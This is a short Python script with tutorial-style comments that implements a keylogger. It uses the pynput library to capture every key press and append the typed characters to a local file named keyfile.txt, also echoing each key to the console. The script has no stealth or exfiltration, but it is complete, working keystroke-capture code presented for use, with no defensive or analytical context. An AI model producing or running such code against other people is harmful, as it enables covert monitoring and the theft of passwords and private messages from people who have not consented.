#IMPORTANT pip install pynput
#Import library pynput. keyboard module captures the keys that are typed.
from pynput import keyboard

#key is defined by on_press, so we don't need to define it.
def keyPressed(key):
    print(str(key))
    # If the keyfile.txt isn't made then it will make one. 'a' will append to the file.
    with open("keyfile.txt", 'a') as logKey:
        #use try & except block because there may be errors.
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    #Start capturing key inputs. When Listener is turned on, it will send the key to the function that's specified.
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()
